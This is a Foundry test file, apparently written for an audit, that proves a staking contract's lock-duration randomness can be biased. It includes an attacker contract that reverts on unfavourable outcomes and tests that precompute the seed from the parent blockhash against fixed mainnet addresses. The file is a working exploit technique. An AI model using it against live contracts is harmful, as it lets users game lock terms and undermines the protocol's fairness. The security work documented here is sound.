// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
/// @notice PoC (feature/fresh-start): 5–10d lock seed is biasable by picking a favourable parent blockhash.
///         Not production. ARC_FORK=true forge test --match-contract LockBiasPoC -vv
import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ArcPrecompiles} from "./utils/ArcPrecompiles.sol";

interface IV2 {
    function stake(uint256 amount) external returns (uint256 index);
    function getLocks(address) external view returns (Lock[] memory);
    function userLockNonce(address) external view returns (uint256);
    function globalLockNonce() external view returns (uint256);
    function MIN_STAKE() external view returns (uint256);
    function LOCK_DURATION() external view returns (uint64);
    function MAX_EXTRA_LOCK() external view returns (uint64);
}
struct Lock { uint128 amount; uint64 unlockAt; }

contract ShortLockOnly {
    IV2 public immutable staking;
    IERC20 public immutable savior;
    uint64 public immutable maxExtra;
    constructor(IV2 s, IERC20 t, uint64 maxExtra_) { staking = s; savior = t; maxExtra = maxExtra_; }
    function stakeIfShort(uint256 amount) external returns (uint64 extra) {
        uint64 ts = uint64(block.timestamp);
        uint256 idx = staking.stake(amount);
        Lock memory L = staking.getLocks(address(this))[idx];
        extra = L.unlockAt - ts - staking.LOCK_DURATION();
        if (extra >= maxExtra) revert("too long");
    }
}

contract LockBiasPoC is Test {
    IV2 constant ST = IV2(0x8807DA96A254B370e1E9ae8d3cc4163d1E2939bB);
    IERC20 constant SAV = IERC20(0xe4065efC5E19305e4ed1dfdB6542A32A34E0cAf3);

    function _predict(address user, address sender, uint256 un, uint256 gn) internal view returns (uint256) {
        return uint256(keccak256(abi.encode(blockhash(block.number - 1), user, sender, un, gn)))
            % (uint256(ST.MAX_EXTRA_LOCK()) + 1);
    }

    /// Simulate a new Arc block with a chosen parent hash (real bots wait for the next real block).
    function _nextParent(bytes32 h) internal {
        uint256 n = block.number + 1;
        vm.roll(n);
        vm.setBlockhash(n - 1, h);
    }

    function test_fork_precompute_and_wait() public {
        vm.skip(!vm.envOr("ARC_FORK", false));
        vm.createSelectFork("arc_mainnet");
        ArcPrecompiles.install(vm);

        address bot = makeAddr("bot");
        deal(address(SAV), bot, 100e6);
        uint256 amt = ST.MIN_STAKE();
        uint256 un = ST.userLockNonce(bot);
        uint256 gn = ST.globalLockNonce();
        uint64 maxWant = 1 hours;

        uint256 tries;
        while (_predict(bot, bot, un, gn) >= maxWant) {
            tries++;
            _nextParent(keccak256(abi.encode("parent", tries)));
            require(tries < 2000, "too many");
        }
        uint256 predicted = _predict(bot, bot, un, gn);
        console2.log("(i) favourable after simulated blocks", tries);
        console2.log("    predicted extra sec", predicted);

        uint64 ts = uint64(block.timestamp);
        vm.startPrank(bot);
        SAV.approve(address(ST), amt);
        uint256 g0 = gasleft();
        uint256 idx = ST.stake(amt);
        console2.log("    stake gas", g0 - gasleft());
        vm.stopPrank();

        uint64 extra = ST.getLocks(bot)[idx].unlockAt - ts - ST.LOCK_DURATION();
        assertEq(uint256(extra), predicted, "eth_call/off-chain precompute == on-chain");
        assertLt(extra, maxWant);
        console2.log("    actual extra sec", extra);
    }

    function test_fork_attacker_contract_conditional_revert() public {
        vm.skip(!vm.envOr("ARC_FORK", false));
        vm.createSelectFork("arc_mainnet");
        ArcPrecompiles.install(vm);

        uint64 maxWant = 12 hours;
        ShortLockOnly atk = new ShortLockOnly(ST, SAV, maxWant);
        deal(address(SAV), address(atk), 100e6);
        vm.prank(address(atk));
        SAV.approve(address(ST), type(uint256).max);

        uint256 amt = ST.MIN_STAKE();
        uint256 un = ST.userLockNonce(address(atk));
        uint256 gn = ST.globalLockNonce();

        // Force an unfavourable parent so the call reverts
        while (_predict(address(atk), address(atk), un, gn) < maxWant) {
            _nextParent(keccak256(abi.encode("bad", un, gn, block.number)));
        }
        uint256 g0 = gasleft();
        vm.expectRevert(bytes("too long"));
        atk.stakeIfShort(amt);
        uint256 gasFail = g0 - gasleft();
        assertEq(ST.userLockNonce(address(atk)), un, "nonce unchanged on revert");
        assertEq(ST.globalLockNonce(), gn);
        console2.log("(ii) failed-try gas", gasFail);
        console2.log("    USDC_18 @20 gwei", gasFail * 20 gwei);

        // Then wait for favourable parent and succeed
        uint256 waits;
        while (_predict(address(atk), address(atk), un, gn) >= maxWant) {
            waits++;
            _nextParent(keccak256(abi.encode("good", waits)));
            require(waits < 2000, "too many");
        }
        console2.log("    waits to success", waits);
        uint64 extra = atk.stakeIfShort(amt);
        console2.log("    success extra sec", extra);
        assertLt(extra, maxWant);
    }

    function test_fork_stats_and_prevrandao() public {
        vm.skip(!vm.envOr("ARC_FORK", false));
        vm.createSelectFork("arc_mainnet");
        uint256 N = uint256(ST.MAX_EXTRA_LOCK()) + 1;
        console2.log("N outcomes", N);
        console2.log("P(<1h) bps", uint256(1 hours) * 10_000 / N);
        console2.log("P(<12h) bps", uint256(12 hours) * 10_000 / N);
        console2.log("P(<1d) bps", uint256(1 days) * 10_000 / N);
        console2.log("E[blocks] <1h", (N + 1 hours - 1) / uint256(1 hours));
        console2.log("E[blocks] <12h", (N + 12 hours - 1) / uint256(12 hours));
        console2.log("E[blocks] <1d", (N + 1 days - 1) / uint256(1 days));
        console2.log("block.prevrandao", uint256(block.prevrandao));
        assertEq(uint256(block.prevrandao), 0, "Arc PREVRANDAO is 0");
    }
}
